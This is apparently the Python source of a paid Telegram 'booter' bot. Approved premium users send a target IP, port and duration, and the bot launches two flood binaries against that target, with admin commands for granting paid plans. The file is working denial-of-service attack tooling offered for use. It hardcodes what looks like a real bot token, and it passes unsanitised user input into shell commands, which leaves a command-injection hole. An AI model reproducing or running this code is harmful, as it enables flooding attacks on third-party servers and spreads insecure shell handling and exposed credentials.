import os
import telebot
import logging
import asyncio
from pymongo import MongoClient
from datetime import datetime, timedelta
from threading import Thread
from telebot.util import escape_markdown

loop = asyncio.get_event_loop()

# Bot Configuration
TOKEN = '8086042271:AAH89ims2kDFFTHoZMHhNx7b8-0rkeDPZfY'
ADMIN_USER_ID = 1210786221  # Replace with the admin user ID
MONGO_URI = 'YOUR_MONGO_CONNECTION_STRING'
USERNAME = "@GTX_GHOST"  # Your bot username
REQUEST_INTERVAL = 1

# MongoDB Configuration
client = MongoClient(MONGO_URI)
db = client['sharp']
users_collection = db.users

# Bot Initialization
bot = telebot.TeleBot(TOKEN)

# Attack status
attack_in_progress = False

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Asyncio thread for the event loop
async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

# Event loop runner
async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

# Run both scripts `./2111` and `./ranbal`
async def run_attack_command_async(target_ip, target_port, duration):
    global attack_in_progress
    attack_in_progress = True  # Flag to prevent concurrent attacks

    try:
        # Trigger both commands
        process_2111 = await asyncio.create_subprocess_shell(f"./2111 {target_ip} {target_port} {duration} 800")
        process_ranbal = await asyncio.create_subprocess_shell(f"./ranbal {target_ip} {target_port} {duration} 800")

        # Wait for both commands to complete
        await asyncio.gather(process_2111.wait(), process_ranbal.wait())

        # Notify completion
        notify_attack_finished(target_ip, target_port, duration)
    except Exception as e:
        logging.error(f"Error running attack commands: {e}")
    finally:
        attack_in_progress = False

# Notify admin when the attack completes
def notify_attack_finished(target_ip, target_port, duration):
    bot.send_message(
        ADMIN_USER_ID,
        f"🔥 *ATTACK COMPLETED!* 🔥\n\n"
        f"🎯 *Target:* `{target_ip}`\n"
        f"💣 *Port:* `{target_port}`\n"
        f"⏳ *Duration:* `{duration} seconds`\n\n"
        f"💥 *Mission accomplished by {escape_markdown(USERNAME, version=2)}!*",
        parse_mode='MarkdownV2'
    )

# Command to initiate an attack
@bot.message_handler(commands=['attack'])
def attack_command(message):
    global attack_in_progress
    chat_id = message.chat.id

    # Check if another attack is already running
    if attack_in_progress:
        bot.send_message(chat_id, f"⚠️ *An attack is already in progress. Please wait.*", parse_mode='MarkdownV2')
        return

    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})

    # Check user authorization
    if not user_data or user_data['plan'] == 0:
        bot.send_message(chat_id, f"🚫 *Unauthorized access. This feature is restricted to premium users.*", parse_mode='MarkdownV2')
        return

    bot.send_message(chat_id, f"📝 Please provide target details in the format: `<IP> <PORT> <DURATION>`.", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)

# Process attack command with validation
def process_attack_command(message):
    try:
        global attack_in_progress

        args = message.text.split()
        if len(args) != 3:
            bot.send_message(
                message.chat.id,
                f"⚠️ *Invalid format. Use: /attack <IP> <PORT> <DURATION>*.",
                parse_mode='MarkdownV2'
            )
            return

        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        # Validate port
        if target_port in blocked_ports:
            bot.send_message(
                message.chat.id,
                f"🚫 *Port {target_port} is restricted. Please choose a different port.*",
                parse_mode='MarkdownV2'
            )
            return

        # Trigger attack commands asynchronously
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)

        bot.send_message(
            message.chat.id,
            f"💀 *ATTACK INITIATED!* 💀\n\n🎯 *Target:* `{target_ip}`\n🔒 *Port:* `{target_port}`\n⏳ *Duration:* `{duration}` seconds",
            parse_mode='MarkdownV2'
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ *Error processing command: {e}*", parse_mode='MarkdownV2')

# Approve or disapprove user
@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id != ADMIN_USER_ID:
        bot.send_message(chat_id, "🚫 You are not authorized to use this command.")
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "⚠️ Invalid command format. Use: `/approve <user_id> <plan> <days>` or `/disapprove <user_id>`.", parse_mode='MarkdownV2')
        return

    action, target_user_id = cmd_parts[0], int(cmd_parts[1])
    plan, days = (int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0), (int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0)

    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until}},
            upsert=True
        )
        bot.send_message(chat_id, f"✅ User {target_user_id} approved for plan {plan} until {valid_until}.")
    else:
        users_collection.update_one({"user_id": target_user_id}, {"$set": {"plan": 0}})
        bot.send_message(chat_id, f"❌ User {target_user_id} disapproved.")

# Main execution
if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("🚀 Bot is running...")

    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Error in polling: {e}")
